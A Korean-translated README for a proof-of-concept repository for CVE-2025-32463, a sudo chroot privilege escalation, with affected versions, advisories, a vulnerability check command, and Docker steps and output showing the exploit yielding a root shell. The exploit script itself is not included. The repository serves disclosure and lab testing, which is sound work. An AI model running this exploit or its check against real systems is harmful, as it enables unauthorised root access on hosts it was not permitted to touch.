
# CVE-2025-32463 – sudo chroot ("chwoot") PoC

이 저장소는 `sudo`의 chroot 기능에서 발생하는 **CVE‑2025‑32463** 권한 상승 취약점을 시연하기 위한 최소 재현 환경을 제공합니다.
- 이 취약점은 [Rich Mirch](https://www.stratascale.com/team/rich-mirch) (X에서 [@0xm1rch](https://x.com/0xm1rch)) @ [Stratascale](https://www.stratascale.com/)에 의해 보고되었습니다.
- 원본 게시물: [Vulnerability Advisory: Sudo chroot Elevation of Privilege](https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot)
- NVD: [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) (CVSS 9.3)

---

## 영향을 받는 버전

> 대부분의 리눅스 배포판에서 **sudo 1.9.14**부터 **1.9.17** (모든 p-리비전)까지 취약한 빌드가 영향을 받습니다.

보안 페이지
- [우분투](https://ubuntu.com/security/CVE-2025-32463) (CVSS 9.3)
- [레드햇](https://access.redhat.com/security/cve/cve-2025-32463) (CVSS 7.8)
- [수세](https://www.suse.com/security/cve/CVE-2025-32463.html) (CVSS 7.8)
- [데비안](https://security-tracker.debian.org/tracker/CVE-2025-32463)

---

## 내용

| 파일                | 용도                                                                                  |
| ------------------ | ---------------------------------------------------------------------------------- |
| **Dockerfile**     | 취약한 **sudo 1.9.16p2**와 빌드 도구가 포함된 우분투 24.04 이미지를 빌드합니다.     |
| **sudo‑chwoot.sh** | chroot 내에서 루트 셸을 생성하는 개념 증명 익스플로잇                                |
| **run.sh**         | 이미지 빌드(필요 시) 및 익스플로잇 컨테이너 실행을 돕는 스크립트                      |

---

## 빠른 취약점 점검

```bash
# Vulnerable sudo
pwn ~ $ sudo -R woot woot
sudo: woot: No such file or directory

# Patched sudo
pwn ~ $ sudo -R woot woot
[sudo] password for pwn:
sudo: you are not permitted to use the -R option with woot
```
## Docker 컨테이너에서 익스플로잇 테스트하기


```bash
# 1 – clone repo
$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
$ cd CVE-2025-32463_chwoot

# 2 – build and run Docker image (tagged "sudo-chwoot")
$ ./run.sh

# 3 – run exploit in container (runs root command directly or drops you into a root shell)
pwn@f722d9182d1f:~$ ./sudo-chwoot.sh id
woot!
uid=0(root) gid=0(root) groups=0(root),1001(pwn)
pwn@f722d9182d1f:~$ ./sudo-chwoot.sh
woot!
root@f722d9182d1f:/# id
uid=0(root) gid=0(root) groups=0(root),1001(pwn)
root@f722d9182d1f:/#
```
`run.sh`는 컨테이너가 종료될 때 스스로 정리되도록 Docker에 `--privileged`와 `--rm`을 전달합니다.

---

## 정리

작업이 끝나면 이미지를 제거하세요:


```bash
docker rmi sudo-chwoot
```
---

## 참고 문헌

- Stratascale CRU 취약점 공지: [취약점 권고: Sudo chroot 권한 상승](https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot)



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-16

---